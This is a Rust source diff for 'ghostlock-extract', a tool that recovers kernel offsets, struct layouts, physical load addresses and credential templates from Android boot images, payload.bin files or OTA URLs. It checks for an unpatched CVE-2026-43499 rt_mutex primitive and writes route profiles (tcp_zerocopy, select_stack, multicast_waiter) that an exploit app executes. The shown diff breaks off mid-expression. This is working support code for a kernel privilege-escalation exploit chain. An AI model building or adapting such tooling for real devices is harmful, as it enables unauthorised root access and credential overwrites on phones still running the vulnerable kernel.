@@ -5,26 +5,31 @@ use std::time::{SystemTime, UNIX_EPOCH};
 
 use clap::Parser;
 
+use ghostlock_extract::analysis;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_nf_logger_registration, derive_pselect_layout,
-    ensure_rtmutex_43499_unpatched, relative_symbols,
+    PSELECT_ROUTE_NFDS, derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
+    ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
-use ghostlock_extract::fdt::recover_kernel_phys_load;
+use ghostlock_extract::fdt::{recover_kernel_phys_load, recover_kernel_phys_load_from_uefi};
+use ghostlock_extract::iomem;
 use ghostlock_extract::kallsyms;
 use ghostlock_extract::kallsyms::Kallsyms;
 use ghostlock_extract::kallsyms_finder;
 use ghostlock_extract::payload;
 use ghostlock_extract::report;
-use ghostlock_extract::symbols::{kernel_struct_macro, resolve_structs, resolve_symbols};
+use ghostlock_extract::symbols::{
+    kernel_layout_verified, kernel_struct_macro, resolve_structs, resolve_symbols,
+};
+use ghostlock_extract::vendor_boot::recover_kernel_phys_from_vendor_boot;
 
 #[derive(Parser, Debug)]
 #[command(
     name = "ghostlock-extract",
     about = "Extract GhostLock kernel offsets from boot.img / arm64 Image / payload.bin / OTA URL",
-    after_help = "examples:\n  ghostlock-extract boot.img --format json --out offsets.json\n  ghostlock-extract boot.img --xbl-config xbl_config.img --register\n  ghostlock-extract payload.bin --register\n  ghostlock-extract https://host/payload.bin --format json --out offsets.json\n  ghostlock-extract boot.img --format c --out offsets.h --name device\nWhen --kallsyms is omitted, the embedded kallsyms table is recovered from the kernel image itself (no root needed); on a rooted phone /proc/kallsyms is used first."
+    after_help = "examples:\n  ghostlock-extract boot.img --format conf --out profile.conf\n  ghostlock-extract boot.img --format json --out offsets.json\n  ghostlock-extract https://host/payload.bin --format json --out offsets.json\nWhen --kallsyms is omitted, the embedded kallsyms table is recovered from the kernel image itself (no root needed); on a rooted phone /proc/kallsyms is used first."
 )]
 struct Cli {
     /// boot.img, raw arm64 Image, gzip Image, payload.bin, OTA ZIP, or http(s) OTA URL
@@ -33,33 +38,43 @@ struct Cli {
     /// embedded kallsyms table is recovered from the kernel image
     #[arg(long)]
     kallsyms: Option<PathBuf>,
+    /// /proc/iomem text file (rooted device dump); when omitted a readable
+    /// /proc/iomem is used to derive kernel_phys_offset and kernel_phys_load
+    #[arg(long)]
+    iomem: Option<PathBuf>,
     /// optional XBL xbl_config.img; derive kernel physical load from its FDT
     #[arg(long)]
     xbl_config: Option<PathBuf>,
+    /// optional UEFI uefi.img; derive kernel physical load from its platform
+    /// memory-map table when xbl_config carries no FDT memory map
+    #[arg(long)]
+    uefi: Option<PathBuf>,
+    /// optional vendor_boot.img (MediaTek only); derive kernel physical load
+    /// AND offset from its header kernel_addr field.
+    #[arg(long)]
+    vendor_boot: Option<PathBuf>,
     /// kernel physical load address (hex or decimal); overrides defaults
     #[arg(long, value_parser = parse_int)]
     phys: Option<u64>,
-    /// device name used in the --format c output header
-    #[arg(long, default_value = "target")]
-    name: String,
-    /// output format: text (JSON), json, or c
-    #[arg(long, value_parser = ["text", "json", "c"], default_value = "text")]
+    /// output format: text (JSON), json, or conf (flattened GLK profile HOCON)
+    #[arg(long, value_parser = ["text", "json", "conf"], default_value = "text")]
     format: String,
-    /// register the kernel table under src/kernels/<release>/offsets.h
-    #[arg(long)]
-    register: bool,
+    /// route written to --format conf; defaults to the analysis suggestion
+    #[arg(long, value_parser = ["tcp_zerocopy", "select_stack", "multicast_waiter"])]
+    route: Option<String>,
     /// treat every unresolved symbol as optional (emit 0)
     #[arg(long)]
     allow_missing: bool,
-    /// overwrite an existing device header that differs
-    #[arg(long)]
-    force: bool,
     /// write output to a file instead of stdout
     #[arg(long)]
     out: Option<PathBuf>,
     /// skip disassembly-based derivation (pselect/loggers heuristics)
     #[arg(long)]
     no_disasm: bool,
+    /// analyse the kernel (family, waiter layout, primitive, route candidates)
+    /// and print a report instead of offsets
+    #[arg(long)]
+    analysis: bool,
     /// working directory for payload extraction and temp files; defaults to
     /// the system temp dir (pass an app-writable dir when running on Android)
     #[arg(long)]
@@ -178,6 +193,7 @@ fn resolve_kallsyms(
 fn run(cli: &Cli) -> Result<i32> {
     let mut boot_path = cli.image.clone();
     let mut xbl_path = cli.xbl_config.clone();
+    let mut uefi_path = cli.uefi.clone();
     let work_root = cli.work_dir.clone().unwrap_or_else(std::env::temp_dir);
 
     if payload::looks_like_payload(cli.image.to_string_lossy().as_ref()) {
@@ -192,15 +208,20 @@ fn run(cli: &Cli) -> Result<i32> {
         eprintln!("info: analyzing partitions: {}", want.join(", "));
         let payload_view = payload::open_payload_for(&input, &work_dir, &want, download_progress())
             .map_err(|err| ExtractError::new(format!("{err:#}")))?;
-        let (extracted_boot, extracted_xbl) =
+        let (extracted_boot, extracted_xbl, extracted_uefi) =
             payload::extract_analysis_inputs(&payload_view, &work_dir)
                 .map_err(|err| ExtractError::new(format!("{err:#}")))?;
         boot_path = extracted_boot;
         xbl_path = extracted_xbl;
+        uefi_path = extracted_uefi;
         eprintln!(
-            "info: extracted boot={} xbl_config={} from payload",
+            "info: extracted boot={} xbl_config={} uefi={} from payload",
             boot_path.display(),
             xbl_path
+                .as_ref()
+                .map(|p| p.display().to_string())
+                .unwrap_or_else(|| "none".to_string()),
+            uefi_path
                 .as_ref()
                 .map(|p| p.display().to_string())
                 .unwrap_or_else(|| "none".to_string())
@@ -208,19 +229,72 @@ fn run(cli: &Cli) -> Result<i32> {
     }
 
     let boot = BootImage::load(&boot_path)?;
-    let mut kernel_phys_load = if let Some(xbl) = &xbl_path {
+    let mut phys_source = "unset";
+    let mut kernel_phys_load: Option<u64> = None;
+    if let Some(xbl) = &xbl_path {
         match recover_kernel_phys_load(xbl) {
-            Ok(phys) => Some(phys),
+            Ok(phys) => {
+                phys_source = "xbl_config FDT";
+                kernel_phys_load = Some(phys);
+            }
             Err(err) => {
-                eprintln!(
-                    "warning: xbl_config FDT parse failed: {err}; proceeding with boot-only analysis"
-                );
-                cli.phys
+                eprintln!("warning: xbl_config FDT parse failed: {err}; trying the uefi memory map")
             }
         }
-    } else {
-        cli.phys
-    };
+    }
+    if kernel_phys_load.is_none() {
+        if let Some(uefi) = &uefi_path {
+            match recover_kernel_phys_load_from_uefi(uefi) {
+                Ok(phys) => {
+                    phys_source = "uefi memory map";
+                    eprintln!("info: kernel_phys_load=0x{phys:x} (uefi memory map)");
+                    kernel_phys_load = Some(phys);
+                }
+                Err(err) => eprintln!(
+                    "warning: uefi memory-map parse failed: {err}; proceeding with boot-only analysis"
+                ),
+            }
+        }
+    }
+    if kernel_phys_load.is_none() && cli.phys.is_some() {
+        phys_source = "--phys";
+        kernel_phys_load = cli.phys;
+    }
+
+    // vendor_boot.img's kernel_addr field always supplies kernel_phys_load;
+    // kernel_phys_offset (the DRAM base) is only set when the alignment
+    // pattern proves it (see vendor_boot::classify) rather than merely
+    // being consistent with it, e.g. for MediaTek devices.
+    let mut vendor_boot_phys_offset: Option<u64> = None;
+    if kernel_phys_load.is_none() {
+        if let Some(vb) = &cli.vendor_boot {
+            match recover_kernel_phys_from_vendor_boot(vb) {
+                Ok((load, Some(offset))) => {
+                    eprintln!(
+                        "info: vendor_boot; kernel_phys_load=0x{load:x} \
+                         kernel_phys_offset=0x{offset:x}"
+                    );
+                    phys_source = "vendor_boot header (MediaTek)";
+                    kernel_phys_load = Some(load);
+                    vendor_boot_phys_offset = Some(offset);
+                }
+                Ok((load, None)) => {
+                    eprintln!(
+                        "info: vendor_boot; kernel_phys_load=0x{load:x} \
+                         (MiB-aligned but not provably the DRAM base; \
+                         kernel_phys_offset left unset, pass --iomem or \
+                         --phys to supply it)"
+                    );
+                    phys_source = "vendor_boot header (MediaTek)";
+                    kernel_phys_load = Some(load);
+                }
+                Err(err) => eprintln!(
+                    "warning: vendor_boot header parse failed: {err}; \
+                     trying other sources"
+                ),
+            }
+        }
+    }
 
     let btf_at = boot.embedded_btf_at();
     let ks = resolve_kallsyms(
@@ -234,16 +308,53 @@ fn run(cli: &Cli) -> Result<i32> {
     let Some(base) = base else {
         return Err(ExtractError::new("_text/_head is not unique in kallsyms"));
     };
+
+    // DRAM base / linear-map offset, and (with the kallsyms delta) the kernel
+    // physical load, from /proc/iomem when available (rooted device or --iomem).
+    let mut kernel_phys_offset: Option<u64> = vendor_boot_phys_offset;
+    let iomem_info = match iomem::load(cli.iomem.as_deref()) {
+        Ok(info) => info,
+        Err(err) => {
+            eprintln!("warning: {err}");
+            None
+        }
+    };
+    if let Some(info) = iomem_info {
+        if let Some(dram_base) = info.dram_base {
+            kernel_phys_offset = Some(dram_base);
+        }
+        if kernel_phys_load.is_none() {
+            if let (Some(kc), Some(text), Some(stext)) = (
+                info.kernel_code_start,
+                kallsyms::unique(&symbols, "_text"),
+                kallsyms::unique(&symbols, "_stext"),
+            ) {
+                let delta = stext.wrapping_sub(text) & 0xffff_ffff;
+                let derived = kc.wrapping_sub(delta) & 0xffff_ffff;
+                eprintln!(
+                    "info: iomem; kernel_phys_load=0x{derived:x} kernel_phys_offset=0x{:x}",
+                    kernel_phys_offset.unwrap_or(0)
+                );
+                kernel_phys_load = Some(derived);
+                phys_source = "iomem";
+            }
+        }
+    }
+
     let (rel_symbols, sorted_offsets) = relative_symbols(&symbols, base);
-    // stop early when remove_waiter() is fixed.
-    match ensure_rtmutex_43499_unpatched(&boot.kernel, &rel_symbols, &sorted_offsets) {
+    // stop early when remove_waiter() is fixed; --analysis reports it instead.
+    let primitive = ensure_rtmutex_43499_unpatched(&boot.kernel, &rel_symbols, &sorted_offsets);
+    match &primitive {
         Ok(remove_waiter) => eprintln!(
             "info: (CVE-2026-43499 primitive present \
              (remove_waiter@{remove_waiter:#x} still uses current)"
         ),
         Err(err) => {
-            eprintln!("error: {err}");
-            return Ok(6);
+            if !cli.analysis {
+                eprintln!("error: {err}");
+                return Ok(6);
+            }
+            eprintln!("warning: analysis continues: {err}");
         }
     }
 
@@ -259,12 +370,12 @@ fn run(cli: &Cli) -> Result<i32> {
     let release = boot.release();
     match release.as_deref() {
         Some(release) => {
-            if kernel_struct_macro(Some(release)).is_none() {
+            if !kernel_layout_verified(Some(release)) {
+                let template = kernel_struct_macro(Some(release));
                 eprintln!(
-                    "warning: {release} is not a verified kernel family \
-                     (6.1, 6.6, 6.12); emitting the 6.6 layout as a testing \
-                     starting point, verify the waiter layout and slab \
-                     stride before trusting it"
+                    "warning: {release} is unverified{}; no family-derived \
+                     geometry will be emitted",
+                    template.map_or(String::new(), |name| format!(" (template {name} only)"))
                 );
             }
         }
@@ -281,6 +392,7 @@ fn run(cli: &Cli) -> Result<i32> {
                          kernel_phys_load=0x{derived:x} (DRAM base)"
                     );
                     kernel_phys_load = Some(derived);
+                    phys_source = "MediaTek DRAM base";
                 }
                 _ => {
                     eprintln!(
@@ -297,15 +409,38 @@ fn run(cli: &Cli) -> Result<i32> {
             );
         }
     }
-    report::validate_kernel_phys_load(
-        release.as_deref(),
-        kernel_phys_load,
-        boot.mtk_lz4 || boot.mtk_gzip,
-    );
+    if cli.route.is_some() && cli.format != "conf" {
+        eprintln!("warning: --route only affects --format conf; ignoring");
+    }
+
+    if cli.analysis {
+        let analysis_report = analysis::build(analysis::Input {
+            release: release.as_deref(),
+            kernel: &boot.kernel,
+            symbols: &symbols,
+            rel_symbols: &rel_symbols,
+            sorted_offsets: &sorted_offsets,
+            btf: btf.as_ref(),
+            phys: kernel_phys_load,
+            phys_source,
+            primitive,
+            allow_disasm: !cli.no_disasm,
+        });
+        let text = analysis::render(&analysis_report);
+        if let Some(out) = &cli.out {
+            std::fs::write(out, text).map_err(|err| ExtractError::new(format!("{err}")))?;
+        } else {
+            print!("{text}");
+        }
+        return Ok(0);
+    }
 
     let mut symbol_offsets = resolve_symbols(&symbols, base);
 
     let mut derived: BTreeMap<String, u64> = BTreeMap::new();
+    // Infeasible pselect geometry only rules out the select_stack route; it is
+    // recorded here and re-checked after route selection instead of aborting.
+    let mut pselect_infeasible: Option<String> = None;
     if !cli.no_disasm {
         if let Some(btf) = &btf {
             match derive_pselect_layout(
@@ -344,8 +479,8 @@ fn run(cli: &Cli) -> Result<i32> {
                     derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
                 }
                 Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("error: pselect route not feasible on this kernel: {message}");
-                    return Ok(3);
+                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                    pselect_infeasible = Some(message);
                 }
                 Err(err) => {
                     eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
@@ -377,12 +512,24 @@ fn run(cli: &Cli) -> Result<i32> {
         .get("pselect_waiter_shift_value")
         .copied()
         .map(|value| value as i64)
-        .unwrap_or_else(|| {
+        .or_else(|| {
+            // An infeasible derivation means this image's layout does not exist;
+            // a family default would be wrong, so it is not substituted.
+            if pselect_infeasible.is_some() {
+                return None;
+            }
             let shift = report::pselect_waiter_shift_for(release.as_deref());
-            eprintln!(
-                "warning: using heuristic pselect_waiter_shift={shift} (6.12=0, 6.6=-2); \
-                 unreliable for kernels with a non-inlined do_pselect middle layer"
-            );
+            if let Some(shift) = shift {
+                eprintln!(
+                    "warning: using verified-family pselect_waiter_shift={shift}; \
+                     image-specific disassembly derivation was unavailable"
+                );
+            } else {
+                eprintln!(
+                    "warning: pselect_waiter_shift unavailable; no family fallback \
+                     is defined for this release"
+                );
+            }
             shift
         });
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
@@ -395,10 +542,6 @@ fn run(cli: &Cli) -> Result<i32> {
         .filter(|(_, value)| value.is_none())
         .map(|(key, _)| key.clone())
         .collect();
-    let existing = report::existing_entries()
-        .get(release.as_deref().unwrap_or(""))
-        .cloned()
-        .unwrap_or_default();
     let mut tolerated: BTreeSet<String> = report::optional_symbols()
         .into_iter()
         .map(str::to_string)
@@ -413,28 +556,37 @@ fn run(cli: &Cli) -> Result<i32> {
         .collect();
     tolerated_missing.sort();
     for key in tolerated_missing {
-        let carried = existing.get(&key).copied().unwrap_or(0);
-        symbol_offsets.insert(key.clone(), Some(carried as u64));
-        if carried != 0 {
-            eprintln!(
-                "warning: {key} not found in kallsyms; carried over 0x{carried:08x} \
-                 from the registered {} entry",
-                release.as_deref().unwrap_or("")
-            );
-        } else {
-            eprintln!(
-                "warning: {key} not found in kallsyms; emitted 0x00000000 (runtime \
-                 falls back to target.h default)"
-            );
-        }
+        symbol_offsets.insert(key.clone(), Some(0));
+        eprintln!(
+            "warning: {key} not found in kallsyms; emitted 0x00000000 (runtime \
+             falls back to target.h default)"
+        );
     }
-    report::require_fields(&symbol_offsets, &BTreeSet::new())?;
+    // A conf candidate carries whatever the image yielded; the app's
+    // pre-execution validation reports the gaps. Every other format keeps the
+    // hard requirement.
+    let candidate = cli.format == "conf";
+    match report::require_fields(&symbol_offsets, &BTreeSet::new()) {
+        Ok(()) => {}
+        Err(err) if candidate => eprintln!(
+            "warning: {err}; writing an unverified candidate (missing fields are omitted and \
+             validated by the app)"
+        ),
+        Err(err) => return Err(err),
+    }
     if btf.is_some() {
         let struct_fields_u64: BTreeMap<String, Option<u64>> = struct_offsets
             .iter()
             .map(|(key, value)| (key.clone(), value.map(|v| v as u64)))
             .collect();
-        report::require_fields(&struct_fields_u64, &BTreeSet::new())?;
+        match report::require_fields(&struct_fields_u64, &report::optional_struct_fields()) {
+            Ok(()) => {}
+            Err(err) if candidate => eprintln!(
+                "warning: {err}; writing an unverified candidate (missing fields are omitted and \
+                 validated by the app)"
+            ),
+            Err(err) => return Err(err),
+        }
     }
     if let Some(mm_size) = struct_offsets.get("struct_mm_struct").copied().flatten() {
         eprintln!(
@@ -446,57 +598,147 @@ fn run(cli: &Cli) -> Result<i32> {
     }
 
     let btf_size = btf_raw.as_ref().map(|b| b.len()).unwrap_or(0);
-    if cli.register {
-        let Some(release) = release.as_deref() else {
-            return Err(ExtractError::new(
-                "--register requires a kernel release string in the boot image",
-            ));
-        };
-        let key = report::kernel_key(release);
-        if report::existing_entries().contains_key(release) && !cli.force {
-            report::warn_existing_mismatches(release, &symbol_offsets);
-            if report::kernel_header_path(&key).exists() {
-                eprintln!("info: {release} already registered; no duplicate table created");
-                return Ok(0);
-            }
-        }
-        let output = report::render_device(
-            release,
-            &symbol_offsets,
-            &struct_offsets,
-            kernel_phys_load,
-            pselect_shift,
-        );
-        let target = report::kernel_header_path(&key);
-        if target.exists()
-            && std::fs::read_to_string(&target)
-                .map(|t| t != output)
-                .unwrap_or(true)
-            && !cli.force
-        {
+    let output = if cli.format == "conf" {
+        let release_text = release
+            .as_deref()
+            .ok_or_else(|| ExtractError::new("--format conf requires a kernel release string"))?;
+        let major = release_text
+            .split('.')
+            .next()
+            .and_then(|part| part.parse::<u32>().ok());
+        if major != Some(5) && major != Some(6) {
             return Err(ExtractError::new(format!(
-                "{} already exists and differs; pass --force to overwrite",
-                target.display()
+                "--format conf needs a 5.x/6.x release, got {release_text}"
             )));
         }
-        std::fs::create_dir_all(target.parent().unwrap())
-            .map_err(|err| ExtractError::new(format!("{err}")))?;
-        std::fs::write(&target, output).map_err(|err| ExtractError::new(format!("{err}")))?;
-        eprintln!("wrote {}", target.display());
-        report::register_kernel(&key)?;
-        report::warn_existing_mismatches(release, &symbol_offsets);
-        return Ok(0);
-    }
-
-    let output = if cli.format == "c" {
-        report::render_c(
-            release.as_deref(),
-            &cli.name,
-            &symbol_offsets,
-            &struct_offsets,
-            kernel_phys_load,
-            pselect_shift,
-        )
+        // Candidate output: emit everything the image actually yielded and
+        // leave the rest out. Whether the result is complete enough to run is
+        // decided by the app's pre-execution validation, not here.
+        let route = match cli.route.as_deref() {
+            Some(route) => Some(route.to_string()),
+            None => {
+                let paths =
+                    analysis::probe_paths(&symbols, &boot.kernel, &rel_symbols, &sorted_offsets);
+                let pselect_derived = derived.contains_key("pselect_waiter_shift_value");
+                let (suggested, _, _) =
+                    analysis::suggest_route(pselect_derived, &paths, release.as_deref());
+                suggested.map(str::to_string)
+            }
+        };
+        // select_stack is the only route that needs the derived pselect layout;
+        // reject it here, after selection, so tcp/multicast can still proceed.
+        if route
+            .as_deref()
+            .is_some_and(analysis::route_depends_on_pselect_layout)
+        {
+            if let Some(message) = &pselect_infeasible {
+                eprintln!("error: pselect route not feasible on this kernel: {message}");
+                return Ok(3);
+            }
+        }
+        let mut geometry = route
+            .as_deref()
+            .map(|route| {
+                report::conf_route_geometry(route, release_text, pselect_shift, &struct_offsets)
+            })
+            .unwrap_or_default();
+        // 5.x multicast: replace the proven-constant waiter_off with the value
+        // statically derived from this image's setsockopt/futex stack frames.
+        // No device or root is involved; the A301SO image reproduces its
+        // hardware-probed 0x60.
+        if route.as_deref() == Some("multicast_waiter") {
+            const MCAST_BUFFER_SIZE: u64 = 264;
+            const RT_MUTEX_WAITER_PI_TREE_ENTRY: u64 = 0x18;
+            match multicast_waiter_off(
+                &boot.kernel,
+                &rel_symbols,
+                &sorted_offsets,
+                MCAST_BUFFER_SIZE,
+                RT_MUTEX_WAITER_PI_TREE_ENTRY,
+            ) {
+                Ok(geom) => {
+                    eprintln!(
+                        "info: multicast waiter_off derived = 0x{:x} \
+                         (setsockopt depth 0x{:x} - futex depth 0x{:x})",
+                        geom.waiter_off, geom.setsockopt_depth, geom.waiter_depth
+                    );
+                    for entry in geometry.iter_mut() {
+                        if entry.0 == "waiter_off" {
+                            entry.1 = geom.waiter_off as i64;
+                        }
+                    }
+                }
+                Err(err) => eprintln!(
+                    "warning: static multicast waiter_off derivation failed: {err}; \
+                     keeping the proven 5.x constant"
+                ),
+            }
+        }
+        match route.as_deref() {
+            Some(route) if geometry.is_empty() => eprintln!(
+                "warning: no image-derived geometry for route {route}; writing an unverified \
+                 candidate route branch"
+            ),
+            Some(_) => {}
+            None => eprintln!(
+                "warning: no route could be inferred; writing release/common fields only \
+                 (pass --route to select one)"
+            ),
+        }
+        if route.as_deref() == Some("multicast_waiter")
+            && !geometry.iter().any(|(key, _)| *key == "task_offset")
+        {
+            eprintln!(
+                "warning: rt_mutex_waiter task/lock offsets are missing from BTF; the multicast \
+                 geometry is partial"
+            );
+        }
+        eprintln!(
+            "info: {release_text} profile is an unverified candidate; the app validates fields \
+             before any execution"
+        );
+        let cred: Vec<(String, String)> = if major == Some(5) {
+            let derived_cred = btf.as_ref().and_then(|btf| {
+                let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten()?;
+                let size = btf.size("cred")?;
+                match derive_cred_5x(btf, &boot.kernel, init_cred_off) {
+                    Ok(cred) => Some(report::conf_cred_5x(&cred, size)),
+                    Err(err) => {
+                        eprintln!("warning: 5.x credential derivation failed: {err}");
+                        None
+                    }
+                }
+            });
+            match derived_cred {
+                Some(cred) => cred,
+                None => {
+                    eprintln!(
+                        "warning: credential template omitted; the built-in profile must \
+                         supply it"
+                    );
+                    Vec::new()
+                }
+            }
+        } else {
+            report::conf_cred_6x()
+        };
+        let extra_offsets = report::ConfExtraOffsets {
+            empty_zero_page: kallsyms::unique(&symbols, "empty_zero_page")
+                .and_then(|value| value.checked_sub(base)),
+        };
+        report::render_conf(&report::ConfInputs {
+            release: release_text,
+            phys: kernel_phys_load,
+            /* DRAM base: from /proc/iomem when the extractor ran on a rooted
+             * device, otherwise left for the profile author to fill. */
+            phys_offset: kernel_phys_offset,
+            symbols: &symbol_offsets,
+            structs: &struct_offsets,
+            route: route.as_deref(),
+            route_geometry: &geometry,
+            cred: &cred,
+            extra_offsets: &extra_offsets,
+        })
     } else {
         let report_value = report::build_report(
             release.as_deref(),
